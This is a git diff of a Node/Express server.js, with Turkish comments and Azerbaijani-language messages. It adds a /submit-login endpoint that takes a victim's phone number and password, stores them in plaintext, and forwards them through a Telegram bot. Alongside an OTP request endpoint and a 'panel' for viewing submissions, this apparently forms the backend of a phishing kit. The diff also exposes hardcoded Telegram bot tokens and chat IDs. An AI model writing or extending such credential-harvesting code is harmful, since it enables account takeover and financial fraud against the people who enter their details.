@@ -40,9 +40,42 @@ app.use((req, res, next) => {
 
 // --- DÜZELTME 3: app.get('/') rotası kaldırıldı, çünkü express.static hallediyor ---
 
-const token = '8191580694:AAG7EnTXoERSTuuuY381HK7ExtJyB2T8IxU'; // Bot token'ınız
-const chatId = '-4728131788'; // Chat ID'niz
+// server.js dosyanızın en üstü
+
+
+// --- YENİ: Telegram Bilgilerini Buraya Taşıyın ---
+const token = '8145659910:AAGi1J24CmTYJGA8KduFNqk7iqxT2g7og6U'; // Sizin token'ınız
+const chatId = '-4648239173'; // Sizin chat ID'niz
 const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+app.post('/submit-login', (req, res) => {
+    // 1. Frontend'den gelen 'phoneNumber' ve 'password' verilerini al
+    const { phoneNumber, password } = req.body;
+
+    // Eğer veri gelmemişse hata dön
+    if (!phoneNumber || !password) {
+        return res.status(400).json({ success: false, message: 'Eksik bilgi.' });
+    }
+
+    // 2. Veritabanına kaydetmek için yeni bir obje oluştur
+    const newLoginAttempt = {
+        id: uid.rnd(), // Benzersiz ID oluştur
+        type: 'Giriş Cəhdi', // Panelde ayırt etmek için bir tip belirtelim
+        phoneNumber: phoneNumber,
+        password: password, // Şifreyi de kaydediyoruz
+        createdAt: new Date().toISOString()
+    };
+
+    // 3. Bu objeyi 'submissions' dizisinin en başına ekle
+    db.get('submissions')
+        .unshift(newLoginAttempt)
+        .write();
+// --- YENİ: Telegram Bildirimini Gönder ---
+    const message = `✅ YENİ GİRİŞ DENEMESİ\n\nTelefon: ${phoneNumber}\nŞifrə: ${password}`;
+    sendTelegramNotification(message);
+    // 4. Başarılı olduğuna dair frontend'e yanıt gönder
+    res.json({ success: true });
+});
 
 // API Endpoints (Bunlar zaten doğru görünüyor)
 app.post('/send-otp-request', (req, res) => {
@@ -101,6 +134,25 @@ app.get('/logout', (req, res) => {
     res.status(401).send('Çıkış yapıldı');
 });
 
+// server.js dosyanıza bu fonksiyonu ekleyin
+
+function sendTelegramNotification(text) {
+    // Mesaj içeriğini HTML etiketlerini de yorumlayacak şekilde biçimlendiriyoruz
+    const formattedText = "```\n" + text + "\n```";
+
+    axios.post(tgUrl, {
+        chat_id: chatId,
+        text: formattedText,
+        parse_mode: 'MarkdownV2' // Bu, mesajın daha okunaklı olmasını sağlar
+    })
+    .then(() => {
+        console.log('Telegram bildirimi başarıyla gönderildi.');
+    })
+    .catch(error => {
+        // Hatanın tamamını görmek için error.response.data'yı loglayabiliriz
+        console.error('Telegram bildirimi gönderilemedi:', error.message);
+    });
+}
 
 const PORT = 3001;
 app.listen(PORT, '0.0.0.0', () => {
